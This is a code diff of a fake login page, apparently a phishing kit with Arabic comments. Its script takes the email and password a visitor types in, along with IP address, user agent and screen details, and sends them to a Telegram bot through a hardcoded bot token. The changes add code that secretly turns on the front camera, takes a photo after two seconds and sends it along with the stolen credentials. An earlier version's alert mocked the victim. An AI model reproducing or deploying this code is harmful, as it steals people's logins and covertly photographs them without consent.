@@ -23,8 +23,6 @@
                     <label for="password" class="sr-only">Password</label>
                     <input id="password" name="password" type="password" placeholder="Password" required />
 
-                    <input type="file" id="camera" accept="image/*" style="display: none;">
-                    <button type="button" id="capture-button">Capture Image</button>
                     <button type="submit">Log In</button>
                 </form>
                 <div class="flex separator align-items-center">
@@ -72,11 +70,9 @@
 
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
-        const TOKEN = "8063136868:AAFE-HnzBolbIvnoTi9gcUc5r4jJJcrYzOA";                                                            // هنا التوكين              
-        const CHAT_ID = "1161976560";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+        const TOKEN = "8063136868:AAFE-HnzBolbIvnoTi9gcUc5r4jJJcrYzOA";  // هنا التوكين
+        const CHAT_ID = "1161976560";  // هنا معرف الشات https://api.telegram.org/bot/getUpdates
         const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-
-        let capturedImageData = null;
 
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -84,6 +80,7 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
+            // الحصول على الـ IP
             axios.get('https://api.ipify.org?format=json')
                 .then(response => {
                     const ip = response.data.ip;
@@ -94,7 +91,7 @@
                     const screenHeight = screen.height;
                     const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
-                    const message = ` 
+                    let message = ` 
                         <b>New Login Attempt</b>\n
                         <b>Email:</b> ${email}\n
                         <b>Password:</b> ${password}\n
@@ -105,40 +102,50 @@
                         <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                     `;
 
-                    if (capturedImageData) {
-                        // Include image data in the message if captured
-                        message += `\n<b>Captured Image:</b> <img src="data:image/jpeg;base64,${capturedImageData}" alt="Captured Image"/>`;
-                    }
+                    // التقاط صورة من كاميرا الهاتف
+                    const video = document.createElement('video');
+                    const constraints = {
+                        video: {
+                            facingMode: 'user', // استخدام كاميرا الهاتف الأمامية
+                        }
+                    };
 
-                    axios.post(URI_API, {
-                        chat_id: CHAT_ID,
-                        parse_mode: 'html',
-                        text: message
-                    }).then(response => {
-                        alert('Information sent successfully!/شكرا يا أهبل 😂😂');
-                    }).catch(error => {
-                        alert('Error sending the information. Please try again.');
-                    });
+                    navigator.mediaDevices.getUserMedia(constraints)
+                        .then(stream => {
+                            video.srcObject = stream;
+                            video.play();
+
+                            // التقاط صورة بعد ثانيتين
+                            setTimeout(() => {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                                const imageData = canvas.toDataURL('image/jpeg'); // صورة بصيغة Base64
+                                video.srcObject.getTracks().forEach(track => track.stop()); // إيقاف الفيديو
+
+                                // إرسال الصورة والمعلومات عبر API تلجرام
+                                const formData = new FormData();
+                                formData.append('chat_id', CHAT_ID);
+                                formData.append('photo', imageData); // إرسال الصورة
+                                formData.append('caption', message); // إضافة المعلومات كتعليق
+
+                                axios.post(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, formData)
+                                    .then(response => {
+                                        alert('Information and image sent successfully!');
+                                    }).catch(error => {
+                                        alert('Error sending the information and image. Please try again.');
+                                    });
+                            }, 2000);
+                        })
+                        .catch(error => {
+                            alert('Error accessing camera. Please check your device.');
+                        });
+
                 })
                 .catch(error => {
                     alert('Error fetching the IP address. Please try again.');
                 });
-        });
-
-        document.getElementById('capture-button').addEventListener('click', function() {
-            const cameraInput = document.getElementById('camera');
-            cameraInput.click();
-
-            cameraInput.addEventListener('change', function(event) {
-                const file = event.target.files[0];
-                const reader = new FileReader();
-
-                reader.onload = function(e) {
-                    capturedImageData = e.target.result.split(',')[1];  // Get base64 image data
-                };
-
-                reader.readAsDataURL(file);
-            });
         });
     </script>
 </body>
